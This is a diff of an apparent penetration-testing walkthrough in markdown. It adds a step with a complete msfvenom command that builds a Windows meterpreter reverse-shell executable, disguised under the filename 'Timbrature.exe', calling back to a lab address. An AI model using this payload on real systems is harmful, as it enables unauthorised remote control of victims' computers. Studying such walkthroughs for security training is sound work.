@@ -135,7 +135,11 @@ To open a remote desktop connection, we can use the following command directly f
  
  6. **Generation of a payload for starting a reverse shell and injection**
 	In a different shell window, we now proceed with the generation of an exploit through which we will try to inject a remote shell client to the computers of the organization.
-	We will use meterpreter as remote shell; for doing so, we run the following command on the Kali Linux machine to generate a payload that st
+	We will use meterpreter as reverse shell; for doing so, we run the following command on the Kali Linux machine to generate a payload that launches the reverse shell client:
+
+    `msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=10.0.2.15 -b "\x00" -f exe -o ./Desktop/Timbrature.exe`
+
+ 
 	
  7. dd
  8. gg
@@ -150,11 +154,11 @@ To open a remote desktop connection, we can use the following command directly f
 
 
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTY0MTA1MzEwNCwtMTg2NzEzMzQ1Miw3Mz
-E2ODUzMTcsMTcwMDUzNDU2MCwxMjMxNzgwNzQ5LDEyMzgyMjgy
-NDYsLTEwODczMzkyNDIsLTE4MTk4MTUyOTIsMjcxNzM0NDQ2LD
-kwNzAzMjc4LDE3MzYzOTc5NzIsMTIxMjI0NDE0MywxNTY1ODAw
-Mjg3LC0yOTI1NDM5MzQsLTE0NDczODgzNjAsLTIwOTc2Nzg4Nj
-MsMTA5NjE4MDExNSwtMTgxNDU3MjkwOCwtMjExMjAxMDU4OCwt
-NDcyODY5OTM3XX0=
+eyJoaXN0b3J5IjpbLTE0ODk3MjUyNjMsLTE4NjcxMzM0NTIsNz
+MxNjg1MzE3LDE3MDA1MzQ1NjAsMTIzMTc4MDc0OSwxMjM4MjI4
+MjQ2LC0xMDg3MzM5MjQyLC0xODE5ODE1MjkyLDI3MTczNDQ0Ni
+w5MDcwMzI3OCwxNzM2Mzk3OTcyLDEyMTIyNDQxNDMsMTU2NTgw
+MDI4NywtMjkyNTQzOTM0LC0xNDQ3Mzg4MzYwLC0yMDk3Njc4OD
+YzLDEwOTYxODAxMTUsLTE4MTQ1NzI5MDgsLTIxMTIwMTA1ODgs
+LTQ3Mjg2OTkzN119
 -->
